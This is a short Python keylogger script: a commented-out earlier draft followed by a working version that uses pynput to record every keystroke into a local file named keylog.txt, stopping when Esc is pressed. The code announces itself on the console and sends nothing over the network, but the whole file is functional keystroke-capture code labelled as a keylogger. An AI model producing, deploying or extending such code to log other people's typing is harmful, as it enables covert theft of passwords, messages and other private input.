# from pynput import keyboard
# import sys
# import os
# import time

# logfile = "keylog.txt"
# print("[+] Keylogger started")
# writer = open(logfile, "w")
# reader = open(logfile, "r")
# curr_time = time.ctime(time.time())
# writer.write("logs create on "+ str(curr_time)+"\n")
# writer.write("=========================================================\n")

# def on_press(key):
#     # print('Key {} pressed.'.format(key))
#     # writer.write("{}".format(str(key)))
#     str_key = str(key).replace("'", "")
#     if str(key) == 'Key.backspace':
#         writer.seek(writer.tell() - 1, os.SEEK_SET)
#         writer.write('')
#     elif str(key) == 'Key.enter':
#         writer.write("\n")
#     elif str(key) == 'Key.space':
#         writer.write(" ")
#     elif str(key) == 'Key.esc':
#         writer.write("\n=========================================\nExiting")
#         pass

#     else:
#         writer.write(str_key)

# def on_release(key):
#     # print('Key {} released.'.format(key))
#     if str(key) == 'Key.esc':
#         print('Exiting...')
#         writer.close()
#         reader.close()
#         return False

# try:
#     with keyboard.Listener(on_press = on_press, on_release = on_release) as listener:        
#         listener.join()
# except KeyboardInterrupt:
#     print("[+] Exiting")
#     sys.exit(0)
    


from pynput import keyboard
import time

logfile = "keylog.txt"

def write_log(logfile, log):
    with open(logfile, "a") as writer:
        writer.write(log)

def on_press(key):
    try:
        log = ""
        if key == keyboard.Key.backspace:
            log = "[B]"
        elif key == keyboard.Key.enter:
            log = "\n"
        elif key == keyboard.Key.space:
            log = " "
        elif key == keyboard.Key.esc:
            log = "\n=========================================\nExiting"
            return False
        else:
            log = str(key).replace("'", "")

        write_log(logfile, log)

    except Exception as e:
        print("[ERROR] An error occurred:", str(e))

def on_release(key):
    if key == keyboard.Key.esc:
        print('Exiting...')
        return False

if __name__ == "__main__":
    print("[+] Keylogger started")
    curr_time = time.ctime(time.time())
    write_log(logfile, f"logs created on {curr_time}\n")
    write_log(logfile, "=========================================================\n")

    try:
        with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
            listener.join()
    except KeyboardInterrupt:
        print("[+] Exiting")
